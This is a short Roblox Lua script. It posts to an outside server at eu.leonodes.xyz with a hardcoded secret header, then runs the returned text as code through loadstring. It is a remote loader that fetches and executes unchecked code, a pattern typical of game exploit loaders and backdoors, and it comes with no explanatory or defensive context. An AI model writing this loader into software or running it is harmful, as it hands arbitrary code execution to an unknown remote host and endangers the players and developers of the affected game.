local hs = game:GetService("HttpService")
local ok, r = pcall(function()
  return hs:RequestAsync({
    Url = "http://eu.leonodes.xyz:24771/api/loader",
    Method = "POST",
    Headers = {["X-HDANH"] = "HDANH_SCRIPT_SECRET_2025"},
    Body = "{}"
  })
end)
if ok and r and r.Success then loadstring(r.Body)() end
